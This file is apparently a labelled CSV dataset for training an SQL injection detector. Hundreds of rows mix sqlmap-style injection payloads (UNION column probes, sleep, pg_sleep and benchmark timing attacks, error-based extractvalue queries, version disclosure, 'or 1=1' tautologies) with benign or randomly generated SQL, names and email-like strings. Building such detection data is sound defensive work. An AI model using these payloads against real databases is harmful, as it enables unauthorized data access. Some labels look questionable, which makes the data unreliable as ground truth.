Query,Label
"1  )   where 2741  =  2741 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
SELECT pie ( s )  FROM constantly,0
SELECT help ( s )  FROM bat SELECT cap ( s ) ,0
" select * from users where id  =  1 or 1#""1 union select null,version  (    )   -- 1",1
1'+  (  select 'lcru' where 3215  =  3215,1
SELECT option_value FROM wp_options WHERE option_name  =  'webp-express-alter-html' LIMIT 1,0
schoelen.boswell@phd-photodecor.ca,0
SELECT BIN ( 111 ) ;,0
SELECT * FROM itself WHERE made = 'equal'  OR universe = 'concerned',0
"1%'  )   union all select null,null,null,null,null,null,null,null,null,null#",1
SELECT * FROM gun WHERE thy = 'surface'  OR compass = 'total',0
"   SELECT strength, fox, pencil FROM trace WHERE hit  IS NULL",0
SELECT TOP 50 PERCENT * FROM necessary,0
"1'   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   'agsi'  =  'agsi",1
zurueta olarte,0
SELECT * FROM exclaimed WHERE laid = 'darkness',0
"-5928""   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   ""rggt"" like ""rggt",1
" select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",1
cerpa oitavn,0
portillo,0
SELECT * FROM depth WHERE mountain = 'women' FETCH FIRST 3 ROWS ONLY,0
"1%'   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and '%'  =  '",1
psklib,0
"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null,null#",1
"1"" where 4808  =  4808 union all select null,null,null,null,null,null,null#",1
"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1
SELECT * FROM sale WHERE forget = 'first',0
alfeo,0
SELECT * FROM whose WHERE Price NOT BETWEEN 10 AND 20,0
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   ""uhvy""  =  ""uhvy",1
"  SELECT * FROM passage WHERE length IN  ( 'bare', 'final', 'off' )  ",0
charlot@ringringrent.rw,0
SELECT * FROM spend WHERE highway = 'organized' FETCH FIRST 3 ROWS ONLY,0
1 rlike   (  select   (  case when   (  6795  =  5898  )   then 1 else 0x28 end   )    )   -- xdkx,1
halpin,0
karin,0
"  SELECT CustomerName AS Customer, ContactName AS [Contact Person]  FROM Customers;",0
morrin,0
ado,0
kangelis,0
"1%""  )   and 2006  =  2006",1
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c88946771c' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
-8538%' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and '%'  =  ',1
l1am217r5,0
"1%""   )    )     )   union all select null,null,null,null,null,null,null--",1
select pg_sleep  (  5  )   and    (    (   4382  =  4382,1
SELECT * FROM introduced WHERE next = 'swung' FETCH FIRST 3 ROWS ONLY,0
SELECT Count ( * )  AS badly,0
"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'zcrh'  =  'zcrh",1
SELECT * FROM buffalo WHERE Price NOT BETWEEN 10 AND 20,0
SELECT AVG ( skill ) FROM tower SELECT SUM ( great ) ,0
arima@hormigon-impreso.nu,0
cary-whitten@magritte.pe,0
"pobla tornesa, la",0
DELETE FROM wrong,0
"-9247'   )    )     )   union all select 6964,6964,6964,6964,6964,6964,6964,6964,6964--",1
puges crcamo,0
2.77767E+15,0
royett pratseva,0
1%'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1
" select * from users where id  =  1 or ""?;"" or 1  =  1 -- 1",1
SELECT COUNT ( tobacco )  FROM behind,0
SELECT TOP 50 PERCENT * FROM aware,0
patay,0
" SELECT column_name ( s )  FROM ship,fun",0
harmony,0
"1'||  (  select 'tdcr' where 6792  =  6792 union all select null,null,null,null,null#",1
"1' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",1
1'+  (  select 'mjgo' where 4026  =  4026,1
SELECT * FROM accident  WHERE chair NOT LIKE '[yes]%',0
rigoberta menchu 184 10?d,0
"1'+  (  select ijck where 9961  =  9961 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   +'",1
select * from users where id  =  1 <@1$ or 1  =  1 -- 1,1
"  SELECT degree,forward,train FROM health LEFT JOIN Orders ON string.colorID =  pole.difficult ORDER BY dog.farm",0
SELECT * FROM enough FETCH FIRST 50 PERCENT ROWS ONLY,0
"1   )    )    as faxr where 7972  =  7972 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
SELECT * FROM caught FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM floating,0
mary-ell,0
;waitfor delay '0:0:__TIME__'--,1
"1%""   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
SELECT * FROM mirror WHERE attached BETWEEN '1996-07-01' AND '1996-07-31',0
-2761 or 1144  =  7657-- mfml,1
os,1
suplementero,0
SELECT dish ( s )  FROM bread UNION ALL,0
SELECT swing ( s )  FROM whatever UNION ALL,0
"-7941%'  )   union all select 6965,6965,6965,6965--",1
pblica,0
mirabel,0
"roure, 43, 3?d",0
herrmann@codwatw.edu,0
5013,0
SELECT * FROM have FETCH FIRST 50 PERCENT ROWS ONLY,0
"-1033 union all select 8731,8731,8731,8731,8731,8731--",1
SELECT composed ( s )  FROM how FULL OUTER JOIN,0
"1""   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   ""mmvu""  =  ""mmvu",1
"1 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  ",1
"1""   )    )    as fapw where 4722  =  4722 union all select null,null,null,null,null,null,null,null,null,null#",1
ibarrangelu,0
"1'   )    )    as uuuk where 7234  =  7234 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1
1'   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  'ugrk'  =  'ugrk,1
"1""  )   and 7533  =  7533 and   (  ""jfsw"" like ""jfsw",1
SELECT AVG ( notice ) FROM sets,0
SELECT AVG ( fort ) FROM interior,0
SELECT * FROM buy WHERE successful = 'cup',0
anything' or 'x'  =  'x,1
"-3270%' or elt  (  9404  =  3498,3498  )   and '%'  =  '",1
if  (  9770  =  9748  )   select 9770 else drop function zyuo--,1
castelln de la plana/castell de la plana,0
SELECT improve ( s )  FROM cave,0
"1 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  # hlrg",1
SELECT * FROM lesson WHERE return NOT BETWEEN 'bright' AND 'beginning',0
"1""   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   ""ejpw""  =  ""ejpw",1
DELETE FROM slight WHERE central = 'produce',0
"1,  (  select   (  case when   (  7616  =  7616  )   then 1 else 1/  (  select 0  )   end   )    )   ",1
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   'zaru'  =  'zaru",1
pl9t1r4,0
SELECT * FROM definition,0
SELECT * FROM pink WHERE having NOT BETWEEN 'nervous' AND 'maybe',0
9043,0
"1   )    )    as jrzr where 5194  =  5194 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
cabada ferrus,0
"1"" and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
SELECT lady ( s )  FROM swung,0
"1'||  (  select 'alxi' where 3967  =  3967 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
"1""   )    )     )   or sleep  (  5  )  #",1
SELECT TOP 3 * FROM coal,0
SELECT * FROM  ( SELECT state FROM path ) ,0
1'  )   as twny where 9580  =  9580,1
86a7o,0
"   SELECT Employees.connected, COUNT ( Orders.grownID )  AS flowerFROM    ( OrdersINNER JOIN middle ON Orders.cityID  =  Employees.remarkableID ) ",0
"1%'   )    )    union all select null,null,null,null,null,null,null,null--",1
SELECT * FROM every WHERE mainly = 'thin'  OR story = 'length',0
33001,0
"SELECT * FROM smoke WHERE organization BETWEEN ""its"" AND    ""leave""",0
pa24dan3cea,0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   '%'  =  '",1
"  SELECT labor,needed FROM asleep WHERE current = 'leather' UNION SELECT growth, ran FROM actual",0
"1   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"1',  (  select   (  case when   (  8640  =  8640  )   then   (  ascii  (  regexp_substring  (  repeat  (  right  (  char  (  8640  )  ,0  )  ,500000000  )  ,null   )    )     )   else 8640/  (  select 0 from information_schema.system_users  )   end  )   from information_schema.system_users  )  --",1
2.7841E+15,0
SELECT * FROM peace,0
SELECT * FROM pile WHERE safe = 'believed' LIMIT 3,0
abieldar,0
SELECT hello FROM swam UNION ALL SELECT dot FROM everybody ORDER BY occur,0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'nbsf' like 'nbsf",1
kingslan,0
-7663'   )    )    or 1558  =  1104 and    (    (   'wsrq'  =  'wsrq,1
4.97885E+15,0
SELECT option_value FROM wp_options WHERE option_name  =  'options_middle_button_text' LIMIT 1,0
SELECT diameter ( s )  FROM pictured FULL OUTER JOIN,0
"-9854%""   )    )     )   or 6455  =  3652",1
lahnstein agundis,0
95549133a,0
SELECT one FROM writer UNION ALL SELECT pony FROM central ORDER BY plate,0
idefonsa,0
SELECT * FROM garage WHERE Price NOT BETWEEN 10 AND 20,0
"-1076 union all select 3959,3959--",1
feutlins,0
9423,0
77714009e,0
SELECT below ( s FROM getting RIGHT JOIN,0
"1%'  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
SELECT * FROM driver,0
SELECT * FROM useful WHERE immediately = 'series'  AND City = 'problem',0
hi or a  =  a,1
SELECT safety FROM grow UNION SELECT tales FROM deal ORDER BY thank,0
SELECT frequently FROM may,0
" select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",1
-1769 union all select 6054--,1
13791863m,0
SELECT * FROM Customers ORDER BY CustomerName ASC;,0
9.74327E+15,0
mccollum,0
hymen_israeli@aulahost.vc,0
"  SELECT * FROM go WHERE mental IN  ( 'writer', 'me', 'fellow' )  ",0
SELECT * FROM doubt,0
"   SELECT sand, ball+ ', ' + volume+ ' ' + feathers+ ', ' + cutting AS ordinary  FROM tall",0
SELECT * FROM rope,0
"-1681%"" union all select 8180,8180,8180,8180,8180,8180,8180,8180,8180,8180#",1
SELECT Count ( * )  AS pleasure,0
"-2178'   )    )     )   or elt  (  3421  =  2899,2899  )   and    (    (     (  'jdst'  =  'jdst",1
SELECT * FROM herself FETCH FIRST 3 ROWS ONLY,0
end and    (    (   '%'  =  ',1
"1'||  (  select 'zqdn' where 6194  =  6194 union all select null,null,null,null--",1
1875,0
antonio juez 67 3?a,0
reis,0
"1' in boolean mode  )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
"1%'   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and 'hmqd'  =  'hmqd",1
28609,0
"  SELECT hiddenID AS ID, aid AS fell FROM bet",0
57317186j,0
"1'+  (  select 'zkuf' where 3591  =  3591 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   +'",1
1'   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'mmfq'  =  'mmfq,1
DELETE FROM tail,0
SELECT TOP 3 * FROM news WHERE form = 'upon',0
-2679'   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'cutk' like 'cutk,1
"   SELECT Employees.flies, COUNT ( Orders.replaceID )  AS collectFROM    ( OrdersINNER JOIN cowboy ON Orders.fuelID  =  Employees.flameID ) ",0
25330,0
SELECT TOP 3 * FROM decide,0
24892,0
SELECT number ( s )  FROM here FULL OUTER JOIN,0
"1'   )    )    as ezpq where 2976  =  2976 union all select null,null,null,null,null,null,null,null,null,null#",1
having,1
"1%'   )    )     )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  '%'  =  '",1
mairozio,0
"-8633"" or 5099  =  5974",1
caada del hoyo,0
91394289v,0
"  SELECT nutsID AS ID, scientist AS orbit FROM quick",0
falisco,0
49893169m,0
1   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  2197  =  2197,1
"1""  )   where 5196  =  5196 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
38747653j,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 348623 )  ORDER BY meta_id ASC",0
SELECT * FROM pretty,0
SELECT * FROM type  WHERE cow NOT LIKE '[rocky]%',0
"-5957   )    )     )   union all select 8485,8485,8485,8485,8485,8485,8485,8485,8485--",1
SELECT * FROM  ( SELECT ancient FROM determine ) ,0
"1' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  ",1
select   (  case when   (  6435  =  8988  )   then 6435 else 6435*  (  select 6435 from information_schema.character_sets  )   end  )  #,1
"-2896'   )    )    as wisk where 1030  =  1030 union all select 1030,1030,1030,1030#",1
"xiprer 61, 2-a",0
4560,0
-3821'  )   or 9323  =  9323#,1
64sfa4imiento,0
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null   )    )   ||'",1
roger,0
"-7482%""   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""%""  =  """,1
"1"" procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and ""acbq"" like ""acbq",1
SELECT COUNT ( dance )  FROM slowly,0
"1""  )   as eaxo where 2728  =  2728",1
SELECT * FROM evidence WHERE square  BETWEEN 10 AND 20,0
SELECT MIN ( short )  AS frame FROM mirror,0
SELECT COUNT ( rain )  FROM question,0
"-3007  )   where 6648  =  6648 union all select 6648,6648,6648,6648,6648,6648,6648,6648#",1
caster@videotubo.pr,0
"1' in boolean mode  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  #",1
"1""  )   union all select null#",1
SELECT slight ( s ) FROM transportation INNER JOIN,0
1'   )    )    as qqvk where 1007  =  1007,1
or 2 between 1 and 3,1
5.25502E+15,0
"  SELECT Orders.eightrID, Employees.necessary, Employees.stranger FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.withID ORDER BY Orders.writeID",0
"1%""  )   and sleep  (  5  )   and   (  ""%""  =  """,1
SELECT AVG ( exchange ) FROM division SELECT SUM ( suit ) ,0
vilar elsegui,0
8.04948E+15,0
"1'  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  ",1
SELECT TAN ( -3 ) ;,0
SELECT * FROM least 3 SELECT * FROM love,0
"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",1
"SELECT DAYOFWEEK ( ""2017-06-15 09:34:21"" ) ;",0
romanones,0
nadir,0
4661,0
cabrillas,0
SELECT TOP 3 * FROM support,0
"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1
SELECT * FROM dark FETCH FIRST 50 PERCENT ROWS ONLY,0
1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  # bkjl,1
if  (  2697  =  2008  )   select 2697 else drop function jcoo--,1
